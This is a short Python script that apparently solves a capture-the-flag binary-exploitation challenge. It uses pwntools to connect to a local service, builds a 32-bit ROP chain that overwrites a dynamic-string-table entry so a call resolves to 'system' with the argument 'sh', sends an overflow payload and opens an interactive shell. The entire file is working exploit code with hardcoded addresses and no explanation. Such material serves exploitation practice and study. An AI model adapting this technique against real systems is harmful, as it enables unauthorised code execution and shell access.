#!/usr/bin/env python


from pwn import *

#context.arch ='i386'
r =remote('127.0.0.1',4001)

# locate at <-_libc_csu_init>
memcpy = 0x080482f0
plt0= 123
read = 0x080482e0
pop3_esi = 0x80484f9
pop2_edi = 0x80484fa
pop1_ebp = 0x80484fb
gmon = 0x8048306 #problem#libc+start
buf =0x80497a0
d =buf+2048

dynamic =  0x08049660 
dynamic_dynstr =dynamic +8 * 8
rop = flat(
    memcpy,pop3_esi,dynamic_dynstr+4,d,4,
    gmon,0xdead,d+12
     )
data = flat(
	 d+4-38,
	'system\x00\x00',
	'sh\x00'
      )
raw_input('@') #p32(0xffd2e39c)
r.send(('A'*14+p32(buf+1024+4)).ljust(1024,'\0') + rop.ljust(1024,'\0')+data)

r.interactive()

